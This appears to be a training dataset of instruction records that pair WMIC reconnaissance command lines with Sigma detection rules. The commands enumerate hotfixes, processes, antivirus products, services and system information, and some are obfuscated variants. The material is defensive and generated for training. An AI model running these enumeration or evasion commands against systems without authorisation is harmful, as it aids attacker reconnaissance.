{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe qfe \\WMIC.exe", "output": "title: Windows Hotfix Updates Reconnaissance Via Wmic.EXE\nid: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45\nstatus: test\ndescription: Detects the execution of wmic with the \"qfe\" flag in order to obtain information about installed hotfix updates on the system. This is often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: ' qfe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe process call create", "output": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe \"process\" \"call\" create", "output": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe process --call create", "output": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic process call create", "output": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe process wmic.exe call create", "output": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe Product", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe \"w\"\"m\"\"i\"\"c\"\".\"\"e\"\"x\"\"e\" Product", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic Product", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe Product wmic.exe", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe AntiVirusProduct AntiSpywareProduct FirewallProduct", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe \\\"wmic\\\".exe AntiVirusProduct AntiSpywareProduct FirewallProduct", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe --antivirus AntiSpywareProduct FirewallProduct", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic AntiVirusProduct AntiSpywareProduct FirewallProduct", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe AntiVirusProduct AntiSpywareProduct FirewallProduct", "output": "title: Potential Product Reconnaissance Via Wmic.EXE\nid: 15434e33-5027-4914-88d5-3d4145ec25a9\nstatus: test\ndescription: Detects the execution of WMIC in order to get a list of firewall and antivirus products\nreferences:\n    - https://thedfirreport.com/2023/03/06/2022-year-in-review/\n    - https://www.yeahhub.com/list-installed-programs-version-path-windows/\n    - https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product\nauthor: Nasreddine Bencherchali\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'Product'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe wmic.exe service", "output": "title: Service Reconnaissance Via Wmic.EXE\nid: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\nrelated:\n    - id: 68bcd73b-37ef-49cb-95fc-edc809730be6\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to check if a certain remote service is running on a remote device.\n    When the test completes, a service information will be displayed on the screen if it exists.\n    A common feedback message is that \"No instance(s) Available\" if the service queried is not running.\n    A common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe \"wmic.exe\" service", "output": "title: Service Reconnaissance Via Wmic.EXE\nid: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\nrelated:\n    - id: 68bcd73b-37ef-49cb-95fc-edc809730be6\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to check if a certain remote service is running on a remote device.\n    When the test completes, a service information will be displayed on the screen if it exists.\n    A common feedback message is that \"No instance(s) Available\" if the service queried is not running.\n    A common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic service", "output": "title: Service Reconnaissance Via Wmic.EXE\nid: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\nrelated:\n    - id: 68bcd73b-37ef-49cb-95fc-edc809730be6\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to check if a certain remote service is running on a remote device.\n    When the test completes, a service information will be displayed on the screen if it exists.\n    A common feedback message is that \"No instance(s) Available\" if the service queried is not running.\n    A common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe service wmic.exe", "output": "title: Service Reconnaissance Via Wmic.EXE\nid: 76f55eaa-d27f-4213-9d45-7b0e4b60bbae\nrelated:\n    - id: 68bcd73b-37ef-49cb-95fc-edc809730be6\n      type: similar\nstatus: test\ndescription: |\n    An adversary might use WMI to check if a certain remote service is running on a remote device.\n    When the test completes, a service information will be displayed on the screen if it exists.\n    A common feedback message is that \"No instance(s) Available\" if the service queried is not running.\n    A common error message is \"Node - (provided IP or default) ERROR Description =The RPC server is unavailable\" if the provided remote host is unreachable\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'service'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe LOGICALDISK get Name,Size,FreeSpace os get Caption,OSArchitecture,Version", "output": "title: Uncommon System Information Discovery Via Wmic.EXE\nid: 9d5a1274-922a-49d0-87f3-8c653483b909\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\n    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\n    and GPU driver products/versions.\n    Some of these commands were used by Aurora Stealer in late 2022/early 2023.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic\n    - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/\n    - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\n    - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n    - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/\n    - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior\nauthor: TropChaud\ndate: 2023-01-26\nmodified: 2023-12-19\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        - Description: 'WMI Commandline Utility'\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_commands:\n        CommandLine|contains:\n            - 'LOGICALDISK get Name,Size,FreeSpace'\n            - 'os get Caption,OSArchitecture,Version'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe \"LOGICALDISK\" \"get\" Name,Size,FreeSpace os get Caption,OSArchitecture,Version", "output": "title: Uncommon System Information Discovery Via Wmic.EXE\nid: 9d5a1274-922a-49d0-87f3-8c653483b909\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\n    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\n    and GPU driver products/versions.\n    Some of these commands were used by Aurora Stealer in late 2022/early 2023.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic\n    - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/\n    - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\n    - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n    - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/\n    - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior\nauthor: TropChaud\ndate: 2023-01-26\nmodified: 2023-12-19\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        - Description: 'WMI Commandline Utility'\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_commands:\n        CommandLine|contains:\n            - 'LOGICALDISK get Name,Size,FreeSpace'\n            - 'os get Caption,OSArchitecture,Version'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe LOGICALDISK --get Name,Size,FreeSpace os --get Caption,OSArchitecture,Version", "output": "title: Uncommon System Information Discovery Via Wmic.EXE\nid: 9d5a1274-922a-49d0-87f3-8c653483b909\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\n    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\n    and GPU driver products/versions.\n    Some of these commands were used by Aurora Stealer in late 2022/early 2023.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic\n    - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/\n    - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\n    - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n    - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/\n    - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior\nauthor: TropChaud\ndate: 2023-01-26\nmodified: 2023-12-19\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        - Description: 'WMI Commandline Utility'\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_commands:\n        CommandLine|contains:\n            - 'LOGICALDISK get Name,Size,FreeSpace'\n            - 'os get Caption,OSArchitecture,Version'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic \\WMIC LOGICALDISK get Name,Size,FreeSpace os get Caption,OSArchitecture,Version", "output": "title: Uncommon System Information Discovery Via Wmic.EXE\nid: 9d5a1274-922a-49d0-87f3-8c653483b909\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\n    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\n    and GPU driver products/versions.\n    Some of these commands were used by Aurora Stealer in late 2022/early 2023.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic\n    - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/\n    - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\n    - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n    - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/\n    - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior\nauthor: TropChaud\ndate: 2023-01-26\nmodified: 2023-12-19\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        - Description: 'WMI Commandline Utility'\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_commands:\n        CommandLine|contains:\n            - 'LOGICALDISK get Name,Size,FreeSpace'\n            - 'os get Caption,OSArchitecture,Version'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe LOGICALDISK get Name,Size,FreeSpace os get Caption,OSArchitecture,Version", "output": "title: Uncommon System Information Discovery Via Wmic.EXE\nid: 9d5a1274-922a-49d0-87f3-8c653483b909\nrelated:\n    - id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\n    including OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\n    and GPU driver products/versions.\n    Some of these commands were used by Aurora Stealer in late 2022/early 2023.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic\n    - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/\n    - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\n    - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n    - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/\n    - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior\nauthor: TropChaud\ndate: 2023-01-26\nmodified: 2023-12-19\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        - Description: 'WMI Commandline Utility'\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_commands:\n        CommandLine|contains:\n            - 'LOGICALDISK get Name,Size,FreeSpace'\n            - 'os get Caption,OSArchitecture,Version'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
